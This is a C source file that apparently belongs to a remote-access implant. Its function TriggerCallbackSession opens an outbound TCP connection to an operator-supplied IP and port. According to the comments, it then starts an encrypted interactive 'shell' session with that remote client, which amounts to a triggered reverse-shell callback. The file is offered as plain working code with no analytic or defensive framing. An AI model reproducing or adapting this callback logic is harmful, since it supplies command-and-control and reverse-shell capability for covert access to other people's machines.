#include "trigger_callback_session.h"
#include "client_session.h"
#include "debug.h"
#include "polarssl/net.h"

#include <signal.h>
#include <unistd.h>
//******************************************************************************
static void connect_alarm( int signo )
{
	(void) signo;
	DL(6);
	exit(0);
	return;
}

//******************************************************************************
int TriggerCallbackSession( char *ip, int port )
{
	int sock;
	int retval = 0;

	// set alarm for connect
	signal(SIGALRM, connect_alarm);
	if (alarm(CONNECT_TIMEOUT) != 0) {
		DLX(2, printf("ERROR: alarm() already set\n"));
	}

	// connect to client
	if (net_connect(&sock, ip, port) < 0) {
		DLX(2, printf("net_connect() failed\n"));
		retval = -1;
		goto cleanup;
	}

	// connect was successful so disable alarm
	alarm(0);

	//alarm( SESSION_TIMEOUT );
	// We have an established TCP/IP connection.
	// This will initialize crypto and start the interactive 'shell' with the client.
	// StartClientSession() will not return until that session closes.
	DLX(2, printf("Starting client session...\n"));
	retval = StartClientSession( sock );
		
	//alarm( 0 );
	// if StartClientSession() returns SHUTDOWN, that case is handled
	// in the caller, the start_triggered_connect() thread

cleanup:
	DL(6);
	net_close(sock);

	return retval;
}
